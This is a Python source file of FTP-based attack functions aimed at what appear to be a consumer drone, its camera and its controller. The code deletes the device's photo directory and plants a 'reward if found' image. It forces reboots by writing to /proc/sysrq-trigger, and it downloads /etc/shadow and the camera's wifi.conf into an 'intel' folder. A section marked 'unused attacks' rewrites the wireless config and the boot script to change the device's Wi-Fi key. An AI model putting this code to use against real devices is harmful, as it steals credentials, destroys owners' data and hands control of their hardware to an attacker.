from ftplib import FTP
import multiprocessing
import os

def plantrecoveryimage(ftp):
    
    try:
        ftp.storbinary('STOR /DCIM/100MEDIA/READ-REWARD-IF-FOUND.jpg', open('../res/img/READ-REWARD-IF-FOUND.jpg', 'rb'))
    except:
        ftp.storbinary('STOR /DCIM/READ-REWARD-IF-FOUND.jpg', open('../res/img/READ-REWARD-IF-FOUND.jpg', 'rb'))
    
    
def cleardcim(ftp):
    
    ftp.cwd('/DCIM')
    for item in ftp.nlst():
        try:
             ftp.delete(item)
        except Exception:
             ftp.rmd(item)
                
                
def softreboot(ftp):
    
    def com():
        try:
            ftp.cwd('/proc')
            ftp.storbinary('STOR sysrq-trigger', open('../res/payloads/sysrq-trigger', 'rb'))
        except Exception as e:
            print str(e)
            
    p = multiprocessing.Process(target=com)
    p.start()
    p.join(2)
    if p.is_alive():
        p.terminate()
        p.join()
                
                
def gatherinteldrone(ftp):
    __retrievefile(ftp, '/etc/shadow', 'drone/')

    
def gatherintelcamera(ftp):
    __retrievefile(ftp, '/MISC/wifi.conf', 'camera/')

    
def gatherintelcontroller(ftp):
    __retrievefile(ftp, '/etc/shadow', 'controller/')
    
    
def __retrievefile(ftp, absolutepath, sub=''):
    
    try:
        f = open('../intel/' + sub + absolutepath[1:].replace('/','-'), 'wb')
        ftp.retrbinary('RETR ' + absolutepath, f.write)
        f.close()
    except Exception as e:
        print str(e)
                

########UNUSED ATTACKS BELOW########

def rebootcontroller(ftp):
    
    ftp.cwd('/proc/')
    ftp.sendcmd('put ../res/payloads/sysrq-trigger')
                
def changepsk(psk, ftp):

    assert (len(psk) >= 8), 'PSK must be at least 8 characters'
    
    # update config files with new PSK
    ftp.cwd('/etc/config/')
    ftp.sendcmd('put wireless_*')
    
    # update boot file with commands to export config files
    ftp.cwd('/etc/init.d/')
    ftp.sendcmd('put rcS')
    
    # trigger system reboot
    ftp.cwd('/proc/')
    ftp.sendcmd('put sysrq-trigger')
    
    ftp.quit()
    
    